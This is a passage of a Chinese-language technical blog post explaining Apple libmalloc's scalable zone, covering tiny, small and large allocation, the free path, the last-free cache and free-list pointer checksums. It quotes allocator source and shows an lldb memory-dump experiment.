size);}</code></pre><p>这里的<code>runtime_default_zone()</code>很重要，其实这里才是去真正的初始化zone</p><pre><code class="c">runtime_default_zone   // inline----inline_malloc_default_zone  //inline--------_malloc_initialize_once  //inline ------------_malloc_initialize()</code></pre><p>下面看<code>_malloc_initialize</code>函数，去掉了一些不相干代码</p><pre><code class="c">static void_malloc_initialize(void *context __unused){    MALLOC_LOCK();    unsigned n;    malloc_zone_t *zone = NULL;    ...    zone = create_scalable_zone(0, malloc_debug_flags);    malloc_zone_register_while_locked(zone);    malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING);        initial_default_zone = zone;    if (n != 0) { // make the default first, for efficiency        unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *);        malloc_zone_t *hold = malloc_zones[0];        if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) {            malloc_set_zone_name(hold, NULL);        }        mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE);        malloc_zones[0] = malloc_zones[n];        malloc_zones[n] = hold;        mprotect(malloc_zones, protect_size, PROT_READ);    }    ...}</code></pre><p>这里主要看<code>create_scalable_zone</code>函数，所以默认的zone实际上就是scalable zone</p><pre><code class="c">malloc_zone_t *create_scalable_zone(size_t initial_size, unsigned debug_flags) {    return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags);}szone_t *create_scalable_szone(size_t initial_size, unsigned debug_flags){    szone_t *szone;    /* get memory for the zone. */    szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC);    if (!szone) {        return NULL;    }    ...    // Query the number of configured processors.    // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives    // the same behavior as the original scalable malloc. MP gets per-CPU magazines    // that scale (way) better.    unsigned int max_mags = mag_max_magazines();    uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1;    rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags);    rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags);#if CONFIG_LARGE_CACHE    // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]    szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10);    /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */    int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;);    if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) {        szone-&gt;large_legacy_reset_mprotect = TRUE;    } else {        szone-&gt;large_legacy_reset_mprotect = FALSE;    }#endif    // Initialize the security token.    szone-&gt;cookie = (uintptr_t)malloc_entropy[0];    szone-&gt;basic_zone.version = 10;    szone-&gt;basic_zone.size = (void *)szone_size;    szone-&gt;basic_zone.malloc = (void *)szone_malloc;    szone-&gt;basic_zone.calloc = (void *)szone_calloc;    szone-&gt;basic_zone.valloc = (void *)szone_valloc;    szone-&gt;basic_zone.free = (void *)szone_free;    szone-&gt;basic_zone.realloc = (void *)szone_realloc;    szone-&gt;basic_zone.destroy = (void *)szone_destroy;    szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc;    szone-&gt;basic_zone.batch_free = (void *)szone_batch_free;    szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect;    szone-&gt;basic_zone.memalign = (void *)szone_memalign;    szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size;    szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief;    szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved1 = 0;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved2 = 0;    /* Prevent overwriting the function pointers in basic_zone. */    mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ);    szone-&gt;debug_flags = debug_flags;    _malloc_lock_init(&amp;szone-&gt;large_szone_lock);    szone-&gt;cpu_id_key = -1UL; // Unused.    CHECK(szone, __PRETTY_FUNCTION__);    return szone;}</code></pre><p>这个函数分配并且初始化了szone，设置了<code>szone_malloc</code>、<code>szone_free</code>等函数</p><p>所以后面在调用<code>malloc</code>和<code>free</code>的时候实际上调用的是<code>szone_malloc</code>、<code>szone_free</code>。<code>szone_malloc</code>的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的<code>malloc_zone_*</code>进行实际的内存分配工作。</p><p>下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致</p><pre><code class="c"> *  frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone    frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482    frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18    frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77    frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103    frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24    frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109    frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37    frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396    frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197    frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68    ....</code></pre><h4 id="scalable-zone"><a href="#scalable-zone" class="headerlink" title="scalable zone"></a>scalable zone</h4><p>szone包含两个racks，分别是tiny和small rack</p><table><thead><tr><th>rack</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>tiny</td><td>&lt;= 496B</td><td>&lt;= 1008B</td></tr><tr><td>small</td><td>&lt;= 128KB</td><td>&lt;=128KB</td></tr></tbody></table><p>大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。</p><ul><li>有几个处理器，rack就有几个magazine</li><li>每个magazine有多个regions，tiny(1MB)、small(8MB)</li><li>每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region)</li></ul><p>具体可以从后面结构体中看出来其包含关系。</p><h5 id="malloc-gt-szone-malloc-gt-szone-malloc-should-clear"><a href="#malloc-gt-szone-malloc-gt-szone-malloc-should-clear" class="headerlink" title="malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear"></a>malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear</h5><pre><code class="c">MALLOC_NOINLINE void *szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested){    void *ptr;    msize_t msize;    if (size &lt;= SMALL_THRESHOLD) {        // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit)        // think tiny        msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested);    } else if (size &lt;= szone-&gt;large_threshold) {        // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS)        // think small        msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested);    } else {        // large: all other allocations        size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift;        if (num_kernel_pages == 0) { /* Overflowed */            ptr = 0;        } else {            ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested);        }    }    return ptr;}</code></pre><p>上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例</p><h5 id="tiny-malloc-should-clear"><a href="#tiny-malloc-should-clear" class="headerlink" title="tiny_malloc_should_clear"></a>tiny_malloc_should_clear</h5><pre><code class="c">void *tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested){    void *ptr;    mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines;    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested);#if DEBUG_MALLOC    if (DEPOT_MAGAZINE_INDEX == mag_index) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\n&quot;);        return (NULL);    }    if (!msize) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\n&quot;);        return (NULL);    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    ptr = tiny_mag_ptr-&gt;mag_last_free;    if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) {        // we have a winner        tiny_mag_ptr-&gt;mag_last_free = NULL;        tiny_mag_ptr-&gt;mag_last_free_msize = 0;        tiny_mag_ptr-&gt;mag_last_free_rgn = NULL;        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        CHECK(szone, __PRETTY_FUNCTION__);        if (cleared_requested) {            memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));        }#if DEBUG_MALLOC        if (LOG(szone, ptr)) {            malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\n&quot;, ptr, msize);        }#endif        return ptr;    }#endif /* CONFIG_TINY_CACHE */    while (1) {        ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);        if (ptr) {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            if (cleared_requested) {                memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));            }            return ptr;        }        if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) {            ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);            if (ptr) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                if (cleared_requested) {                    memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));                }                return ptr;            }        }        // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc().        // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first        // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section.        // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the        // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation,        // and retry-ing threads succeed in the code just above.        if (!tiny_mag_ptr-&gt;alloc_underway) {            void *fresh_region;            // time to create a new region (do this outside the magazine lock)            tiny_mag_ptr-&gt;alloc_underway = TRUE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags);            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);            // DTrace USDT Probe            MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE);            if (!fresh_region) { // out of memory!                tiny_mag_ptr-&gt;alloc_underway = FALSE;                OSMemoryBarrier();                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                return NULL;            }            ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region);            // we don&#39;t clear because this freshly allocated space is pristine            tiny_mag_ptr-&gt;alloc_underway = FALSE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            return ptr;        } else {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            yield();            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);        }    }    /* NOTREACHED */}</code></pre><p>这里的<code>if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)</code>是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从<code>ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);</code>free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。</p><h5 id="free-gt-malloc-zone-free-gt-szone-free"><a href="#free-gt-malloc-zone-free-gt-szone-free" class="headerlink" title="free-&gt;malloc_zone_free-&gt;szone_free"></a>free-&gt;malloc_zone_free-&gt;szone_free</h5><pre><code class="c">voidszone_free(szone_t *szone, void *ptr){    region_t tiny_region;    region_t small_region;#if DEBUG_MALLOC    if (LOG(szone, ptr)) {        malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\n&quot;, ptr);    }#endif    if (!ptr) {        return;    }    /*     * Try to free to a tiny region.     */    if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\n&quot;, ptr);        return;    }    if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) {        if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\n&quot;, ptr);            return;        }        free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0);        return;    }    /*     * Try to free to a small region.     */    if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\n&quot;, ptr);        return;    }    if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) {        if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\n&quot;, ptr);            return;        }        free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0);        return;    }    /* check that it&#39;s a legal large allocation */    if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\n&quot;, ptr);        return;    }    free_large(szone, ptr);}</code></pre><p>同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例</p><pre><code class="c">voidfree_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size){    msize_t msize;    boolean_t is_free;    mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region);    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size);    // ptr is known to be in tiny_region    if (known_size) {        msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1);    } else {        msize = get_tiny_meta_header(ptr, &amp;is_free);        if (is_free) {            free_tiny_botch(rack, ptr);            return;        }    }#if DEBUG_MALLOC    if (!msize) {        malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\n&quot;, ptr);        return;    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d    if (DEPOT_MAGAZINE_INDEX != mag_index) {        if (msize &lt; TINY_QUANTUM) {                      // to see if the bits fit in the last 4 bits            void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL            msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize;            region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn;            /* check that we don&#39;t already have this pointer in the cache */            if (ptr == ptr2) {                free_tiny_botch(rack, ptr);                return;            }            if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) {                memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize));            }            tiny_mag_ptr-&gt;mag_last_free = ptr;            tiny_mag_ptr-&gt;mag_last_free_msize = msize;            tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region;            if (!ptr2) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                return;            }            msize = msize2;            ptr = ptr2;            tiny_region = rgn2;        }    }#endif /* CONFIG_TINY_CACHE */    // Now in the time it took to acquire the lock, the region may have migrated    // from one magazine to another. I.e. trailer-&gt;mag_index is volatile.    // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock)    // is stale. If so, keep on tryin&#39; ...    region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region);    mag_index_t refreshed_index;    while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        mag_index = refreshed_index;        tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);        SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);    }    if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) {        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);    }    CHECK(szone, __PRETTY_FUNCTION__);}</code></pre><p>free的时候先将该内存缓存到<code>mag_last_free</code>，若之前<code>mag_last_free</code>为NULL，那么该内存暂时不会被free，仅仅是缓存到<code>mag_last_free</code>。反之，则会将<code>mag_last_free</code>之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点</p><ul><li>最近free的内存会被缓存，不会立即合并</li><li>在被free的块metadata是被保护的<ul><li>前后指针按16字节大小对齐</li><li>指针前4位为checksum</li></ul></li></ul><p>关于free块checksum计算如下：</p><pre><code class="c">static MALLOC_INLINE uintptr_tfree_list_checksum_ptr(rack_t *rack, void *ptr){    uintptr_t p = (uintptr_t)ptr;    return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction}</code></pre><p>指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>代码如下</p><pre><code class="c">#include &lt;stdio.h&gt;int main(int argc, char *argv[]) {    void *p1,*p2,*p3,*p4;    p1 = malloc(24);    p2 = malloc(24);    p3 = malloc(24);    p4 = malloc(24);    memset(p1,0xaa,24);    memset(p2,0xbb,24);    memset(p3,0xcc,24);    free(p1);    free(p3);    free(p2);    free(p4);}</code></pre><p>free(p1)，直接将p1缓存，所以内存值不变</p><pre><code class="c">(lldb) x/24gx p10x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x3000000010020023 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x200000001002001f0x100200240: 0xcccccccccccc0002 0x00020000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x50000000100200480x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x10000000100201080x100200240: 0xcccccccccccc0002 0x00060000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。</p><h4 id="libmalloc中一些结构体"><a href="#libmalloc中一些结构体" class="headerlink" title="libmalloc中一些结构体"></a>libmalloc中一些结构体</h4><h5 id="szone-s-magazine-zone-h"><a href="#szone-s-magazine-zone-h" class="headerlink" title="szone_s // magazine_zone.h"></a>szone_s // magazine_zone.h</h5><pre><code class="c">typedef struct szone_s {      // vm_allocate()&#39;d, so page-aligned to begin with.    malloc_zone_t basic_zone; // first page will be given read-only protection    uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)];    unsigned long cpu_id_key; // unused    // remainder of structure is R/W (contains no function pointers)    unsigned debug_flags;    void *log_address;    /* Allocation racks per allocator type. */    struct rack_s tiny_rack;    struct rack_s small_rack;    /* large objects: all the rest */    _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large    unsigned num_large_objects_in_use;    unsigned num_large_entries;    large_entry_t *large_entries; // hashed by location; null entries don&#39;t count    size_t num_bytes_in_large_objects;#if CONFIG_LARGE_CACHE    int large_entry_cache_oldest;    int large_entry_cache_newest;    large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free    boolean_t large_legacy_reset_mprotect;    size_t large_entry_cache_reserve_bytes;    size_t large_entry_cache_reserve_limit;    size_t large_entry_cache_bytes; // total size of death row, bytes#endif    /* flag and limits pertaining to altered malloc behavior for systems with     * large amounts of physical memory */    unsigned is_largemem;    unsigned large_threshold;    unsigned vm_copy_threshold;    /* security cookie */    uintptr_t cookie;    /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small     * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */    struct szone_s *helper_zone;    boolean_t flotsam_enabled;} szone_t;</code></pre><h5 id="malloc-zone-t-malloc-h"><a href="#malloc-zone-t-malloc-h" class="headerlink" title="malloc_zone_t // malloc.h"></a>malloc_zone_t // malloc.h</h5><pre><code class="c">typedef struct _malloc_zone_t {    /* Only zone implementors should depend on the layout of this structure;    Regular callers should use the access functions below */    void    *reserved1;    /* RESERVED FOR CFAllocator DO NOT USE */    void    *reserved2;    /* RESERVED FOR CFAllocator DO NOT USE */    size_t     (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */    void     *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);    void     *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */    void     *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */    void     (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);    void     *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);    void     (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g    const char    *zone_name;    /* Optional batch callbacks; these may be NULL */    unsigned    (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */    void    (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */    struct malloc_introspection_t    * MALLOC_INTROSPECT_TBL_PTR(introspect);    unsigned    version;    /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);    /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */    size_t     (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);    /*     * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10.     * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has     * not yet been allocated. False negatives are not allowed.     */    boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);} malloc_zone_t;</code></pre><h5 id="rack-t-magazine-rack-h"><a href="#rack-t-magazine-rack-h" class="headerlink" title="rack_t // magazine_rack.h"></a>rack_t // magazine_rack.h</h5><pre><code class="c">typedef struct rack_s {    /* Regions for tiny objects */    _malloc_lock_s region_lock MALLOC_CACHE_ALIGN;    rack_type_t type;    size_t num_regions;    size_t num_regions_dealloc;    region_hash_generation_t *region_generation;    region_hash_generation_t rg[2];    region_t initial_regions[INITIAL_NUM_REGIONS];    int num_magazines;    unsigned num_magazines_mask;    int num_magazines_mask_shift;    uint32_t debug_flags;    // array of per-processor magazines    magazine_t *magazines;    uintptr_t cookie;    uintptr_t last_madvise;} rack_t;</code></pre><h5 id="magazine-t-magazine-zone-h"><a href="#magazine-t-magazine-zone-h" class="headerlink" title="magazine_t // magazine_zone.h"></a>magazine_t // magazine_zone.h</h5><pre><code class="c">typedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with.    // Take magazine_lock first,  Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc    _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN;    // Protection for the crtical section that does allocate_pages outside the magazine_lock    volatile boolean_t alloc_underway;    // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size.    void *mag_last_free;    msize_t mag_last_free_msize;    // msize for mag_last_free#if MALLOC_TARGET_64BIT    uint32_t _pad;#endif    region_t mag_last_free_rgn; // holds the region for mag_last_free    free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS];    uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS];    // the first and last free region in the last block are treated as big blocks in use that are not accounted for    size_t mag_bytes_free_at_end;    size_t mag_bytes_free_at_start;    region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0    // bean counting ...    size_t mag_num_bytes_in_objects;    size_t num_bytes_in_magazine;    unsigned mag_num_objects;    // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria    // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria.    // Doubly linked list for efficient extraction.    unsigned recirculation_entries;    region_trailer_t *firstNode;    region_trailer_t *lastNode;#if MALLOC_TARGET_64BIT    uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS -            (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2];#else    uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS -            MAGAZINE_FREELIST_BITMAP_WORDS];#endif} magazine_t;</code></pre><h5 id="tiny-region-t-magazine-zone-h"><a href="#tiny-region-t-magazine-zone-h" class="headerlink" title="tiny_region_t //magazine_zone.h"></a>tiny_region_t //magazine_zone.h</h5><pre><code class="c">/* * Layout of a tiny region */typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t))typedef struct tiny_header_inuse_pair {    uint32_t header;    uint32_t inuse;} tiny_header_inuse_pair_t;typedef struct region_trailer {    struct region_trailer *prev;    struct region_trailer *next;    boolean_t recirc_suitable;    volatile int pinned_to_depot;    unsigned bytes_used;    mag_index_t mag_index;} region_trailer_t;#define NUM_TINY_BLOCKS 64520typedef struct tiny_region {    tiny_block_t blocks[NUM_TINY_BLOCKS];    region_trailer_t trailer;    // The interleaved bit arrays comprising the header and inuse bitfields.    // The unused bits of each component in the last pair will be initialized to sentinel values.    